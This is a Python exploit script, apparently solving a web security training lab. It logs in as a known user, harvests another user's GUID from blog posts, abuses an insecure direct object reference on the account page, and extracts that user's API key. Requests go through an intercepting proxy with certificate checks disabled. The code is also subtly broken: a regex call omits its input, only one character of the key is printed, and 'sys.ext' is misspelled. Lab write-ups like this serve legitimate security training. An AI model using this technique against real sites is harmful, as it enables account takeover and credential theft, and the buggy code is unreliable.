import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http" : "http://127.0.0.1:8080", "https" : "http://127.0.0.1:8080"}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def carlos_guid(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    res = r.text
    post_ids = re.findall(r'postId=(\w+)"', res)
    unique_post_ids = list(set(post_ids))
    # print(unique_post_ids)

    #Loop through post ids and identify which one is written by carlos user!
    for i in unique_post_ids:
        r = s.get(url + "/post?postId=" + i, verify=False, proxies=proxies)
        res = r.text
        if 'carlos' in res:
            print("(+) Found Carlos GUID...")
            guid = re.findall("userid=(.*)'",res)[0]
            return guid

def carlos_api_key(s, url):

    #Get csrf token from login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    #login as the wiener acc
    print('(+) Logging in as wiener user......')
    data_login = {"username": "wiener", "password": "peter", "csrf": csrf_token}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text

    if "Log out" in res:
        print("(+) Successfully logged in as the wiener user!")
    
        #Obtain Carlo's GUID
        guid = carlos_guid(s, url)

        #Obtain Carlos's API Key
        carlos_account_url  = url + "/my-account?id=" + guid
        r = s.get(carlos_account_url, verify=False, proxies=proxies)
        res = r.text
        if 'carlos' in res:
            print("(+) Successfully accessed Carlos's account...")
            print("(+) Retrieving API key...")
            api_key = re.findall(r'Your API key is:(.*)<\/div>')[0]
            print('API key is: ' + api_key[0])
        else:
            print("(-) Couldnt access Carlos' account!!!")
            sys.exit(-1)

    else:
        print("(-) Could not login as the wiener user.")
        sys.ext(-1)


def main():
    if len(sys.argv) != 2:
        print("(+)Usage: %s <url>: " % sys.argv[0])
        print("(+)Example: %s www.example.com: " % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    carlos_api_key(s,url)




if __name__ == '__main__':
        main()